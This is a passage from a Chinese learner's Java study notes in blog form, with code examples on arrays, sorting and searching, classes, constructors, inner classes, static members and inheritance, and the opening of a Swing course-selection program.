System.out.println(ret1);        System.out.println(ret2);    &#125;</code></pre><p>法二</p><pre><code class="Java">public static String toString(int[] arr) &#123;        if (arr == null)            return &quot;null&quot;;        int iMax = arr.length - 1;        if (iMax == -1)            return &quot;[]&quot;;        StringBuilder b = new StringBuilder();        b.append(&#39;[&#39;);        for (int i = 0  ; ; i++) &#123;            b.append(arr[i]);            if (i == iMax)                return b.append(&#39;]&#39;).toString();            b.append(&quot;, &quot;);        &#125;    &#125;    public static void main(String[] args) &#123;        int[] array = &#123;1, 2, 3, 4&#125;;        int[] arr2 = null;        String ret1 = toString(array);        String ret2= toString(arr2);        System.out.println(ret1);        System.out.println(ret2);    &#125;</code></pre><h4 id="数组拷贝"><a href="#数组拷贝" class="headerlink" title="数组拷贝"></a>数组拷贝</h4><pre><code class="java">public static void main(String[] args) &#123;        int[] arr = &#123;1,3,5,7,9&#125;;        int[] arr2 =  arr;//这不算拷贝，没有新的内存空间        int[] arr3 = new int[arr.length];        for (int i = 0; i &lt; arr.length; i++) &#123;            arr3[i] = arr[i];        &#125;        System.out.println(Arrays.toString(arr));        System.out.println(Arrays.toString(arr3));    &#125;</code></pre><p>方法实现</p><pre><code class="Java">public static void main(String[] args) &#123;        int[] arr = &#123;1,2,3,4&#125;;        int[] arr2 = Arrays.copyOf(arr, arr.length);        System.out.println(Arrays.toString(arr2));        //扩容2倍        int[] arr3 = Arrays.copyOf(arr, arr.length * 2);        System.out.println(Arrays.toString(arr3));                int[] arr4 = Arrays.copyOfRange(arr, 2, 3);        System.out.println(Arrays.toString(arr4));        int[] arr5 = arr.clone();        System.out.println(Arrays.toString(arr5));    &#125;</code></pre><h4 id="求平均值"><a href="#求平均值" class="headerlink" title="求平均值"></a>求平均值</h4><pre><code class="java">public static double avg(int arr[]) &#123;        int sum = 0;        for(int x : arr) &#123;            sum += x;        &#125;        return sum * 1.0 / arr.length;    &#125;    public static void main(String[] args) &#123;        int[] arr = &#123;1, 2 ,3, 3&#125;;        System.out.println(avg(arr));    &#125;</code></pre><h4 id="找下标"><a href="#找下标" class="headerlink" title="找下标"></a>找下标</h4><pre><code class="java">    public static int find1(int[] arr, int key) &#123;        for (int i = 0; i &lt; arr.length; i++) &#123;            if (arr[i] == key) &#123;                return i;            &#125;        &#125;        return -1;    &#125;    public static int binarySearch(int[] arr, int key) &#123;        int left = 0;        int right = arr.length - 1;        while (left &lt; right) &#123;            int mid = (left + right) &gt;&gt;&gt; 1;            if (arr[mid] &lt; key) &#123;                left = mid + 1;            &#125; else if (arr[mid] &gt; key) &#123;                right = mid - 1;            &#125; else &#123;                return mid;            &#125;        &#125;        return -1;    &#125;    public static void main(String[] args) &#123;        int[] arr = &#123;1, 8 ,3, 3,4,5,7&#125;;        Arrays.sort(arr);//快排,升序，降序需要比较器，没学;        //也可以用Arrays.binarySearch()        System.out.println(Arrays.toString(arr));        System.out.println(binarySearch(arr, 4));    &#125;</code></pre><h4 id="复习下冒泡"><a href="#复习下冒泡" class="headerlink" title="复习下冒泡"></a>复习下冒泡</h4><pre><code class="java">public static void sort(int[] arr) &#123;        int len = arr.length - 1;        for (int i = 0; i &lt; len; i++) &#123;            for (int j = 0; j &lt; len - i; j++) &#123;                if (arr[j] &gt; arr[j + 1]) &#123;                    int tmp = arr[j + 1];                    arr[j + 1] = arr[j];                    arr[j] = tmp;                &#125;            &#125;        &#125;        System.out.println(Arrays.toString(arr));    &#125;</code></pre><p>优化</p><pre><code class="java">    public static void bubblesort(int[] arr) &#123;        for (int i = 0; i &lt; arr.length - 1; i++) &#123;            boolean flg = false;            for (int j = 0; j &lt; arr.length - i - 1; j++) &#123;                if (arr[j] &gt; arr[j + 1]) &#123;                    int tmp = arr[j];                    arr[j] = arr[j +  1];                    arr[j + 1] = tmp;                    flg =true;                &#125;            &#125;            if (flg == false)                return;        &#125;    &#125;    public static void main(String[] args) &#123;        int[] arr = &#123;10,3,7,8,5&#125;;        bubblesort(arr);        System.out.println(Arrays.toString(arr));    &#125;</code></pre><h4 id="数组逆序"><a href="#数组逆序" class="headerlink" title="数组逆序"></a>数组逆序</h4><pre><code class="java">    public static void reverse(int[] arr) &#123;        int left = 0;        int right = arr.length - 1;        while (left &lt; right) &#123;            int tmp = arr[left];            arr[left] = arr[right];            arr[right] = tmp;            left++;            right--;        &#125;    &#125;    public static void main(String[] args) &#123;        int[] arr = &#123;1,2,3,4,5&#125;;        reverse(arr);        System.out.println(Arrays.toString(arr));    &#125;</code></pre><h4 id="数组比较"><a href="#数组比较" class="headerlink" title="数组比较"></a>数组比较</h4><pre><code class="java">    public static void main(String[] args) &#123;        int[] arr = &#123;1,2,3&#125;;        int[] arr2 = &#123;1,2,3&#125;;        boolean fla = Arrays.equals(arr, arr2);        System.out.println(fla);    &#125;</code></pre><h4 id="批量初始化"><a href="#批量初始化" class="headerlink" title="批量初始化"></a>批量初始化</h4><pre><code class="java">    public static void main(String[] args) &#123;        int[] arr = new int[10];        Arrays.fill(arr, 2, 5, -1);        System.out.println(Arrays.toString(arr));    &#125;s</code></pre><h1 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h1><pre><code class="java">    public static void main3(String[] args) &#123;        //不规则数组,没指定列arr[0]是null        int[][] arr = new int[2][];        arr[0] = new int[3];        arr[1] = new int[4];        System.out.println(Arrays.toString(arr[0]));        System.out.println(Arrays.toString(arr[1]));    &#125;    public static void main2(String[] args) &#123;        //打印        int[][] arr = new int[2][3];        for (int i = 0; i &lt; 2; i++) &#123;            for (int j = 0; j &lt; 3; j++) &#123;                System.out.print(arr[i][j] + &quot; &quot;);            &#125;            System.out.println();        &#125;        for (int[] arr1: arr) &#123;            for (int x : arr1) &#123;                System.out.print(x + &quot; &quot;);            &#125;            System.out.println();        &#125;        System.out.println();        System.out.println(Arrays.toString(arr));//地址        System.out.println(Arrays.toString(arr[0]));//一维数组        System.out.println(Arrays.toString(arr[1]));//地址        System.out.println(Arrays.deepToString(arr));//[[0, 0, 0], [0, 0, 0]]    &#125;    //定义    public static void main1(String[] args) &#123;        int[][] arr = new int[2][3];        int[][] arr2 = new int[][]&#123;&#123;1,2,3&#125;,&#123;4,5,6&#125;&#125;;        int[][] arr3 = &#123;&#123;1,3,3&#125;,&#123;8,9,0&#125;&#125;;    &#125;</code></pre><h3 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h3><pre><code class="Java">    //数组中是否存在三个连续的奇数    public static boolean func5(int[] arr) &#123;        int count = 0;        for (int i = 0; i &lt; arr.length; i++) &#123;            if(arr[i] % 2 != 0) &#123;                count++;                if (count ==3) &#123;                    return true;                &#125;            &#125; else &#123;                count = 0;            &#125;        &#125;        return false;    &#125;    public static void main(String[] args) &#123;        int[] arr = &#123;1,2,3,5,7&#125;;        System.out.println(func5(arr));    &#125;    //多数元素leecode169    public int majorityElement(int[] arr) &#123;        Arrays.sort(arr);        return arr[arr.length/2];    &#125;    //投票法    public static int majorityElement2(int[] arr) &#123;        int ret = arr[0];        int count = 0;        for (int i = 0; i &lt; arr.length; i++) &#123;            if (arr[i] == ret) &#123;                count++;            &#125; else &#123;                count--;            &#125;            if (count == 0) &#123;                ret = arr[i + 1];            &#125;        &#125;        return ret;    &#125;    public static void main(String[] args) &#123;        int[] arr = &#123;1,2,3,4,4&#125;;        System.out.println(majorityElement2(arr));    &#125;    //一个数组，进有一个元素出现一次，其它都出现俩次    public static int func4(int[] arr) &#123;        int ret = 0;        for (int i = 0; i &lt; arr.length; i++) &#123;            ret = ret ^ arr[i];        &#125;        return ret;    &#125;    public static void main5(String[] args) &#123;        int[] arr = &#123;1,2, 3, 2, 1&#125;;        System.out.println(func4(arr));    &#125;     public static int[] funca(int[] arr, int target) &#123;        int[] ret = new int[2];        for (int i = 0; i &lt; arr.length; i++) &#123;            for (int j = i + 1; j &lt; arr.length; j++) &#123;                if (arr[i] + arr[j] == target) &#123;                    ret[0] = i;                    ret[1] = j;                    return ret;                &#125;            &#125;        &#125;        return ret;    &#125;    //奇数位于偶数之前    public static void func(int[] arr) &#123;        int left = 0;        int right = arr.length - 1;        while (left &lt; right) &#123;            while (left &lt; right &amp;&amp; arr[left] % 2 != 0) &#123;                left++;            &#125;            while (left &lt; right &amp;&amp; arr[right] % 2 == 0) &#123;                right--;            &#125;            int tmp = arr[left];            arr[left] = arr[right];            arr[right] = tmp;        &#125;    &#125;    public static void main5(String[] args) &#123;        int[] arr = &#123;1,2,3,4,5,6&#125;;        func(arr);        System.out.println(Arrays.toString(arr));    &#125;    public static void transform1(int[] a) &#123;        for (int i = 0; i &lt; a.length; i++) &#123;            a[i] = a[i] * 2;        &#125;    &#125;    public static int[] transform(int[] a) &#123;        int[] tmpArr = new int[a.length];        for (int i = 0; i &lt; a.length; i++) &#123;            tmpArr[i] = a[i] * 2;        &#125;        return tmpArr;    &#125;    public static void main4(String[] args) &#123;        int[] a = &#123;1,2,3,4,6&#125;;        int[] ret = transform(a);//a不变        System.out.println(Arrays.toString(ret));    &#125;</code></pre><h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><pre><code class="Java">class Person &#123;    //属性    public int age;    public String name;    //行为（方法）    public void eat() &#123;        System.out.println(&quot;吃饭&quot;);    &#125;&#125;//类名 大驼峰//方法名 小驼峰class WashJi &#123;    //属性[字段]---》成员属性    public String brand;    //品牌    public String type;     //型号    public double weight;   //重量    public double length;   //长度    public double width;   //宽    public double height;   //高    public String color;   //颜色    //行为[方法]----》成员方法    public void WashJi() &#123;        System.out.println(&quot;洗衣功能&quot;);    &#125;    public void dryClothes() &#123;        System.out.println(&quot;脱水功能&quot;);    &#125;    public void setTime() &#123;        System.out.println(&quot;定时功能&quot;);    &#125;&#125;class Dog &#123;    public String name;    public String color;    public void barks() &#123;        System.out.println(name + &quot;汪汪叫~~~&quot;);    &#125;    public void wag() &#123;        System.out.println(name + &quot;摇尾巴&quot;  );    &#125;    public static void func(String ret) &#123;        System.out.println(ret);    &#125;&#125;public class cal &#123;    public static void main(String[] args) &#123;        //实例化一个对象        Dog dog = new Dog();        dog.name = &quot;ctl&quot;;        dog.barks();        dog.name=&quot;ctl1&quot;;        dog.wag();        Dog dog2 = new Dog();        dog2.name = &quot;ximu&quot;;        dog2.wag();        String ret = &quot;ctl1&quot;;        //通过一个类可以实例化无数对象        dog.func(ret);    &#125;    public static void main1(String[] args) &#123;        Person person = new Person();        person.eat();    &#125;&#125;</code></pre><h2 id="this"><a href="#this" class="headerlink" title="this"></a>this</h2><ul><li>this的类型：对应类类型引用，即哪个对象调用就是哪个对象的引用类型</li><li>this只能在成员方法中使用</li><li>在成员方法中，this只能引用当前对象，不能再引用其它对象</li><li>this是成员方法第一个隐藏的参数，编译器会自动传递，在成员方法执行时，编译器会负责将调用成员方法对象的引用传递给该成员方法，this来接收</li></ul><pre><code class="java">public class cal &#123;   public int year;   public int month;   public int day;   //this.day = 1会报错   public void getData(int year, int month, int day) &#123;       year = year;       month = month;       day = day;   &#125;//这里局部变量会被回收，局部变量优先，这里只是自己给自己赋值了   public void getData1(int year, int month, int day) &#123;       this.year = year;       this.month = month;       this.day = day;   &#125;   public void printData() &#123;       System.out.println(year + &quot;/ &quot; + month + &quot;/ &quot; + day);   &#125;   public void printData1() &#123;       System.out.println(this.year + &quot;/ &quot; + this.month + &quot;/ &quot; + this.day);   &#125;   public static void main(String[] args) &#123;       cal c1 = new cal();       cal c2 = new cal();       cal c3 = new cal();       c1.getData(1,1,1); // 0/0/0       c2.getData1(1,1,1);// 1 / 1/ 1       c3.getData1(1,1,1);       c1.printData1();       c2.printData1();       c3.printData1();   &#125;   public static void main1(String[] args) &#123;       cal c1 = new cal();       //c1.getData(1,1,10);       //c1.getData1(2023,6,6);       /*c1.month=2;       c1.year=1;       c1.day=3;*/       c1.printData();   &#125;&#125;</code></pre><h3 id="作业-1"><a href="#作业-1" class="headerlink" title="作业"></a>作业</h3><pre><code class="java">public class Stu &#123;   public  String name;   public int age;   public void setInof(String name, int age) &#123;       this.name = name;       this.age = age;   &#125;   public void myName() &#123;       System.out.println(&quot;My name is &quot; + name);   &#125;   public void myInfo() &#123;       this.myName();       System.out.println(this.age);   &#125;   public static void main(String[] args) &#123;       Stu stu = new Stu();       stu.setInof(&quot;yxz&quot;, 12);       stu.myName();       stu.myInfo();   &#125;&#125;</code></pre><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><pre><code class="java">public class Stu &#123;   public  String name = &quot;yxz&quot;;//就地初始化，但只适合默认的一些量   public int age;   public void setInof(String name, int age) &#123;       this.name = name;       this.age = age;   &#125;   public void myName() &#123;       System.out.println(&quot;My name is &quot; + name);   &#125;   //构造方法   public Stu() &#123;       //要写在第一条       this(&quot;yxz&quot;, 12);       System.out.println(&quot;不带参数的构造方法&quot;);   &#125;   public Stu(String name, int age) &#123;//构造方法可以重载1.方法名相同，2.参数列表不同3.返回值不一定相同       //this();//不能循环调用       System.out.println(&quot;带俩个参数的构造犯法&quot;);       this.name=name;       this.age=age;   &#125;   public void myInfo() &#123;       this.myName();       System.out.println(this.age);   &#125;   public static void main2(String[] args) &#123;       Stu stu = new Stu();//实例化时一定会调用构造方法，若没有提供，编译器会提供一个       Stu stu2 = new Stu(&quot;yxz&quot;, 12);//构造方法调用完成后，对象才实际上产生       //stu.setInof(&quot;yxz&quot;, 12);//引用类型默认值是null/*        stu.myName();       stu.myInfo();*/   &#125;&#125;</code></pre><h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><pre><code class="java">class Person &#123;   public String name;   public int age;   private String add;   public void setName(String name) &#123;       this.name = name;   &#125;   public String getName() &#123;       return this.name;   &#125;   public void show() &#123;       System.out.println(&quot;姓名：&quot; + name + &quot;\n&quot; + &quot; 年龄：&quot; + age);   &#125;&#125;public class Test2 &#123;   public int age;   public static void main1(String[] args) &#123;       Person pe = new Person();       pe.setName(&quot;yxz&quot;);   &#125;&#125;</code></pre><h2 id="private"><a href="#private" class="headerlink" title="private"></a>private</h2><pre><code class="java">class Alpha &#123;    private int iamprivate;        public Alpha( int i)&#123;        iamprivate=i;    &#125;        boolean isEqualTo(Alpha anotherAlpha) &#123;        if (this.iamprivate == anotherAlpha.iamprivate)            return true;        else            return false;    &#125;   &#125;   public class Test&#123;   public static void main(String args[])&#123;       Alpha aa=new Alpha(10);       Alpha bb=new Alpha(12);              if(aa.isEqualTo(bb))&#123;         System.out.println(&quot;equal &quot;);       &#125;       else&#123;          System.out.println(&quot;not equal &quot;);       &#125;  &#125;&#125;</code></pre><p>结果是nuo equal </p><pre><code class="java">mport java.util.Scanner;public class Main &#123;    public static void main(String[] args) &#123;        Person p = new Person();        Scanner scanner = new Scanner(System.in);        while (scanner.hasNextInt()) &#123;            int age = scanner.nextInt();            p.setAge(age);            System.out.println(p.getAge());        &#125;    &#125;&#125;class Person &#123;    private int age;    //write your code here......    public void setAge(int age) &#123;        this.age = age;    &#125;    public int getAge() &#123;        if (this.age &lt; 0) &#123;            return 0;        &#125; else if (this.age &gt; 200) &#123;                return 200;        &#125; else &#123;            return this.age;        &#125;    &#125;&#125;</code></pre><h1 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h1><pre><code class="java">public class Outer&#123;     private int size;    /** 定义内部类Inner */    public class Inner&#123;             //将外包类的成员变量size递增        public void doStuff()&#123;             size++;           &#125;    &#125;    Inner i=new Inner(); //成员变量i指向Inner类的对象        public void increaseSize()&#123;         i.doStuff(); //调用内部类Inner的方法    &#125;    public static void main(String[] a)&#123;         Outer o=new Outer();                for (int i = 0; i&lt;4; i++)&#123;           o.increaseSize();           System.out.println(&quot;The value of size : &quot;+o.size);        &#125;    &#125;&#125;</code></pre><pre><code class="java">public class Outer&#123;     private int size;    /** 定义内部类Inner */    public class Inner&#123;             private int size;            public void doStuff(int size)&#123;             size++; //存取局部变量            this.size++;  //存取内部类的成员变量            Outer.this.size++; //存取其外包类Outer的成员变量            System.out.println(&quot;size in Inner.doStuff(): &quot;+size);            System.out.println(&quot;size of the Inner class: &quot;+this.size);            System.out.println(&quot;size of the Outer class:  &quot;+Outer.this.size);        &#125;    &#125;    Inner i=new Inner(); //成员变量i指向Inner类的对象        public void increaseSize(int s)&#123;         i.doStuff(s); //调用内部类Inner的方法    &#125;    public static void main(String[] a)&#123;         Outer o=new Outer();                o.increaseSize(10);    &#125;&#125;</code></pre><pre><code class="java">class Outer&#123;     private int size=5;    /** 方法makeInner()，返回一内部类对象 */    public Object makeInner(final int finalLocalVar)&#123;         int LocalVar=6;        class Inner&#123;             public String toString()&#123;                 return (&quot;#&lt;Inner size=&quot;+size+                                 &quot; finalLocalVar=&quot;+finalLocalVar+&quot;&gt;&quot;);            &#125;        &#125;        return new Inner(); //方法makeInner()返回一内部类对象    &#125;    public static void main(String[] args)&#123;        Outer outer=new Outer ();        Object obj=outer.makeInner(40);        System.out.println(&quot;The object is &quot;+obj.toString());    &#125;   &#125;</code></pre><pre><code class="java">class OuterClass &#123;    public int data1;    int data2;    public static int data3;    public void test() &#123;        System.out.println(&quot;OuterClass:;test()&quot;);    &#125;    //实例内部类    class InnerClass &#123;        public int data1 = 122;//就近原则，若非要外部类中的data1则可以用Outer.this.data1;        public int data4;        int data5;        //public static int data5; // error static是类的成员，Inner和成员是一级的        public static final int data6 = 6;//但需要更高的版本，加上final变成常量了        //实力内部类当中，不能有静态成员变量，非要定义用final        //        public void func() &#123;            System.out.println(&quot;InnerClass::func()&quot;);            System.out.println(OuterClass.this.data1);            System.out.println(data2);            System.out.println(data3);            System.out.println(data4);            System.out.println(data5);            System.out.println(data6);        &#125;        public void test() &#123;            System.out.println(&quot;Inner&quot;);            final int size = 10;//定义常量，在编译时就确定了，一旦初始化，不能修改        &#125;    &#125;&#125;public class Test &#123;    public static void main(String[] args) &#123;        OuterClass oc = new OuterClass();        System.out.println(oc.data1);        OuterClass.InnerClass ic = oc.new InnerClass();//获取实例内部类对象        ic.func();    &#125;&#125;</code></pre><ul><li>外部类中的任何成员都可以在实例内部类方法中直接访问</li><li>实力内部类所在位置与外部类成员位置相同，因此也受public 等访问限制符的约束</li><li>在实例内部类中访问同名的成员时优先访问自己的，如果要访问外部类的同名成员，必须用：外部类名.this.同名成员来访问</li><li>实例内部类对象必须是在先有外部类对象的前提下才能创建</li><li>实力内部类的非静态方法包含了一个指向外部类的引用</li><li>外部类中，不能直接访问实例内部了中的成员，如果要访问不许先创建内部类的对象</li></ul><h2 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h2><pre><code class="java">class OuterClass2 &#123;    public int data1 = 1;    int data2 = 2;    public static int data3 = 3;    public void test() &#123;        System.out.println(&quot;out::test&quot;);    &#125;    static class InnerClass2 &#123;        public int data4 = 4;        int data5 = 5;        public static int data6 = 6;        public  void func() &#123;            System.out.println(&quot;inn::test&quot;);            /*System.out.println(this.data1);            System.out.println(data2);*///无法访问外部类的非静态成员            //非要访问            OuterClass2 oc3 = new OuterClass2();            System.out.println(oc3.data1);            System.out.println(data3);            System.out.println(data4);            System.out.println(data5);            System.out.println(data6);        &#125;    &#125;&#125;public class Test2 &#123;    public static void main(String[] args) &#123;        OuterClass2.InnerClass2 oc2 = new OuterClass2.InnerClass2();//这样不需要先创建外部类对象        oc2.func();    &#125;&#125;</code></pre><ul><li>静态内部类中只能访问外部类中的静态成员</li><li>非要访问，得新建一个外部类对象</li><li>创建静态内部类是不需要创建外部类对象</li></ul><h2 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h2><pre><code class="java">public class Test2 &#123;    public static void func1() &#123;        class Inner &#123;            public void test() &#123;                System.out.println(&quot;dasdsadsad&quot;);            &#125;        &#125;        Inner in = new Inner();        in.test();//只能在方法中使用    &#125;    public static void main(String[] args) &#123;            &#125;&#125;</code></pre><ul><li>局部内部类只能在所定义得方法体内部使用</li><li>不能被public，static等修饰</li><li>几乎不会被使用</li></ul><h2 id="匿名内部类-学完接口回来"><a href="#匿名内部类-学完接口回来" class="headerlink" title="匿名内部类(学完接口回来)"></a>匿名内部类(学完接口回来)</h2><pre><code class="java"></code></pre><h1 id="static"><a href="#static" class="headerlink" title="static"></a>static</h1><ul><li>static 修饰的成员变量称为静态成员变量，最大特性是：不属于某个具体的对象，是所有对象所共享的。<br><em>静态成员变量特征</em></li><li>不属于某个具体的对象，是类的属性，是所有对象所共享的。不存在某个对象的空间中。</li><li>既可以通过对象访问，也可以通过类名访问，但一般推荐类名访问</li><li>类变量储存在方法区中</li><li>生命周期伴随类的一生，随类的加载而创建，随类的卸载而销毁</li><li>静态的方法内也不能访问非静态的成员或方法但非静态的可以</li><li>静态方法无法重写，不能用来实现多态</li><li>初始化要么在类内，要么在类外</li></ul><h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><pre><code class="java">public class Stu &#123;    public  String name = &quot;yxz&quot;;//就地初始化，但只适合默认的一些量    public int age;    //构造方法    public Stu() &#123;        System.out.println(&quot;不带参数的构造方法&quot;);    &#125;    &#123;        System.out.println(&quot;实例代码块&quot;);    &#125;    static &#123;        System.out.println(&quot;静态代码块&quot;);    &#125;    public static void main(String[] args) &#123;        Stu stu = new Stu();//静态的执行的更快        Stu stu2 = new Stu();//static只会执行1次，赋值时如果都是static就看顺序    &#125;&#125;</code></pre><h1 id="对象的打印"><a href="#对象的打印" class="headerlink" title="对象的打印"></a>对象的打印</h1><pre><code class="java">class A &#123;    public int a = 1;    @Override    public String toString() &#123;        return &quot;A&#123;&quot; +                &quot;a=&quot; + a +                &#39;&#125;&#39;;    &#125;public class Test2 &#123;&#125;    public static void main(String[] args) &#123;        A a = new A();        System.out.println(a);        System.out.println(new OuterClass2());//匿名对象 ,只能使用一次    &#125;&#125;</code></pre><p>右键-&gt;生成-&gt;toString()</p><h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><pre><code class="java">class Animal &#123;    public String name;    public int age;    public void eat() &#123;        System.out.println(name + &quot;正在吃饭！&quot;);    &#125;&#125;class Dog extends Animal &#123;    public void barks() &#123;        System.out.println(name + &quot;汪汪叫！&quot; + &quot;年龄&quot; + age);    &#125;&#125;class Cat extends Animal &#123;    public void catchMouse() &#123;        System.out.println(name + &quot;正在抓老鼠&quot;);    &#125;&#125;public class jc &#123;    public static void main(String[] args) &#123;        Dog dog = new Dog();        dog.name = &quot;ctl&quot;;        dog.age = 12;        dog.barks();        dog.eat();    &#125;&#125;</code></pre><ul><li>子类会将父类的成员变量和方法继承到子类中</li><li>子类继承父类之后，必须要添加自己特有的成员，体现出与基类的不同，否则就没必要继承了。</li><li>私有的成员可以被继承但不能访问，所以会报错</li></ul><pre><code class="Java">class Base &#123;    int a;    int b;    public void methodA() &#123;        System.out.println(&quot;Base中的methodA()&quot;);    &#125;&#125;public class Jc2 extends Base &#123;    int a;    int b;    int c;    public void  methodB() &#123;        a = 10;//当父类和字类拥有同名变量时，优先访问类自己的        super.b = 20;        c = 30;        System.out.println(a);        System.out.println(b);        System.out.println(super.b);        System.out.println(c);    &#125;    public static void main(String[] args) &#123;        Jc2 jc2 = new Jc2();        Base base = new Base();        System.out.println();    &#125;&#125;</code></pre><pre><code class="java">class Base &#123;    int a;    int b;    public void methodA() &#123;        System.out.println(&quot;Base中的methodA()&quot;);    &#125;&#125;public class Jc2 extends Base &#123;/*    public void methodA() &#123;        System.out.println(&quot;Jc2中的methodA（）&quot;);    &#125;*/    public void methodB() &#123;        System.out.println(&quot;Jc2中的methodB（）&quot;);    &#125;    public void methodC() &#123;        methodB();// 访问子类自己的methodB（）        methodA();// 访问子类继承的methodA（）    &#125;    public static void main(String[] args) &#123;        Jc2 jc2 = new Jc2();        jc2.methodC();    &#125;&#125;</code></pre><h1 id="学生选课系统"><a href="#学生选课系统" class="headerlink" title="学生选课系统"></a>学生选课系统</h1><pre><code class="java">import java.awt.BorderLayout;import java.awt.CardLayout;import java.awt.Component;import java.awt.FlowLayout;import java.awt.GridLayout; import java.awt.event.*;import java.io.*;import java.util.*;import java.util.stream.Collectors;import java.util.Map.Entry;import javax.swing.*;import javax.swing.event.MenuEvent;import javax.swing.event.MenuListener;public class CourseSelectionSystem&#123;    Database db;    LoginFrame login_frame;    MainFrame manager_frame;    Teach teach;        public CourseSelectionSystem() throws IOException &#123;        db = new Database(&quot;course.txt&quot;,&quot;score.txt&quot;,&quot;account.txt&quot;);                db.addAccount(&quot;teach&quot;, &quot;666666&quot;, 0, &quot;教务员  &quot;);  //增加新账号        db.addAccount(&quot;lil&quot;, &quot;666666&quot;, 1, &quot;李立  &quot;);        db.addAccount(&quot;yangf&quot;, &quot;666666&quot;, 1, &quot;杨帆  &quot;);        db.addAccount(&quot;zhangdw&quot;, &quot;666666&quot;, 1, &quot;张大伟  &quot;);        db.addAccount(&quot;wangqs&quot;, &quot;666666&quot;, 2, &quot;王青松  &quot;);        db.addAccount(&quot;chenl&quot;, &quot;666666&quot;, 2, &quot;陈丽  &quot;);        db.addAccount(&quot;wus&quot;, &quot;666666&quot;, 2, &quot;吴松  &quot;);        db.addAccount(&quot;liuq&quot;, &quot;666666&quot;, 2, &quot;刘强  &quot;);                        teach = new Teach(db);        login_frame = new LoginFrame(db, teach);        manager_frame = new MainFrame(db);        login_frame.initFrame(manager_frame);        manager_frame.initFrame(login_frame);    &#125;    public LoginFrame getLogin() &#123;        return login_frame;    &#125;        public static void main(String[] args) throws IOException &#123;        CourseSelectionSystem css =  new CourseSelectionSystem();        css.getLogin().setVisible(true);    &#125;&#125;class MainFrame extends JFrame&#123;    Database db;    LoginFrame login_frame;    private User user;    private JButton manager_new_course = new JButton(&quot;添加课程&quot;);    private JButton student_select_course = new JButton(&quot;选择课程&quot;);    private JButton student_delect_course = new JButton(&quot;删除课程&quot;);    private JButton teacher_view_course = new JButton(&quot;查看选课情况&quot;);    private JButton teacher_info_course = new JButton(&quot;查看课程信息&quot;);    private JButton teacher_score = new JButton(&quot;打分&quot;);    private JLabel manager_jl_0 = new JLabel();    private JLabel teacher_jl_0 = new JLabel();    private JLabel teacher_jl_1 = new JLabel(&quot;选择课程:&quot;);    private JLabel student_jl_0_0 = new JLabel();    private JLabel student_jl_0_1 = new JLabel();    private JLabel student_jl_0_2 = new JLabel();    private JTextField manager_jt_course_name =  new JTextField();    private JTextField manager_jt_course_info =  new JTextField();    private JTextField teacher_jt_score =  new JTextField();    private JLabel manager_jl_init = new JLabel();    private JLabel teacher_jl_init = new JLabel();    private JLabel student_jl_init = new JLabel();    private JLabel manager_jl_1 = new JLabel(&quot;课程名字\n&quot;);    private JLabel manager_jl_2 = new JLabel(&quot;课程教师\n&quot;);    private JLabel manager_jl_3 = new JLabel(&quot;课程信息\n&quot;);    private JComboBox manager_jc_teacher = new JComboBox();    private JComboBox teacher_jc_course = new JComboBox();        DefaultListModel student_select_course_dlm = new DefaultListModel();    JList student_select_course_jl = new JList(student_select_course_dlm);    JScrollPane student_select_course_jsp = new JScrollPane(student_select_course_jl);    DefaultListModel student_delect_course_dlm = new DefaultListModel();    JList student_delect_course_jl = new JList(student_delect_course_dlm);    JScrollPane student_delect_course_jsp = new JScrollPane(student_delect_course_jl);        DefaultListModel teacher_score_dlm = new DefaultListModel();    JList teacher_score_jl = new JList(teacher_score_dlm);    JScrollPane teacher_score_jsp = new JScrollPane(teacher_score_jl);    private JPanel menu_cards = new JPanel();    private CardLayout menu_c_layout = new CardLayout();    private JPanel content_cards = new JPanel();    private CardLayout content_c_layout = new CardLayout();    private JPanel manager_cards = new JPanel();    private CardLayout manager_c_layout = new CardLayout();    private JMenuBar manager_menuBar = new JMenuBar();    private JMenu manager_menu = new JMenu(&quot;添加课程&quot;);    private JPanel manager_init_page = new JPanel();    private JPanel manager_new_course_page = new JPanel();    private JPanel teacher_cards = new JPanel();    private CardLayout teacher_c_layout = new CardLayout();    private JMenuBar teacher_menuBar = new JMenuBar();    private JMenu teacher_menu = new JMenu(&quot;教学任务管理&quot;);    private JPanel teacher_init_page = new JPanel();    private JPanel teacher_score_page = new JPanel();    private JPanel teacher_score_north = new JPanel();    private JPanel teacher_score_north_course = new JPanel();    private JPanel teacher_score_south = new JPanel();    private JPanel student_cards = new JPanel();    private CardLayout student_c_layout = new CardLayout();    private JMenuBar student_menuBar = new JMenuBar();    private JMenu student_menu_select_course = new JMenu(&quot;选课&quot;);    private JMenu student_menu_delect_course = new JMenu(&quot;退选&quot;);    private JMenu student_menu_view_course = new JMenu(&quot;View Course&quot;);    private JPanel student_init_page = new JPanel();    private JPanel student_select_course_page = new JPanel();    private JPanel student_delect_course_page = new JPanel();    private JPanel student_view_score_page = new JPanel();        public MainFrame(Database db) &#123;        super(&quot;选课系统&quot;);        this.addWindowListener(new WindowAdapter() &#123;              @Override              public void windowClosing(WindowEvent e)              &#123;                 try &#123;                    db.updataAll();                &#125; catch (IOException e1) &#123;                    e1.printStackTrace();                &#125;                setVisible(false);                login_frame.setVisible(true);                clear();              &#125;          &#125;);        this.db = db;                setLocation(800,400);           setLayout(new BorderLayout());        menu_cards.setLayout(menu_c_layout);        content_cards.setLayout(content_c_layout);        add(&quot;North&quot;,menu_cards);        add(&quot;Center&quot;,content_cards);                        initManagerPage();        initTeacherPage();        initStudentPage();                pack();    &#125;        private void initTeacherPage() &#123;        teacher_score_jl.setCellRenderer(new ScoreCellRenderer());        teacher_jc_course.setRenderer(new CourseTeaCellRenderer());                teacher_menuBar.add(teacher_menu);        teacher_menu.addMenuListener(new MenuListener() &#123;            @Override            public void menuSelected(MenuEvent e) &#123;                teacher_c_layout.show(teacher_cards, &quot;teacher_score_page&quot;);            &#125;            @Override            public void menuDeselected(MenuEvent e) &#123;                            &#125;            @Override            public void menuCanceled(MenuEvent e) 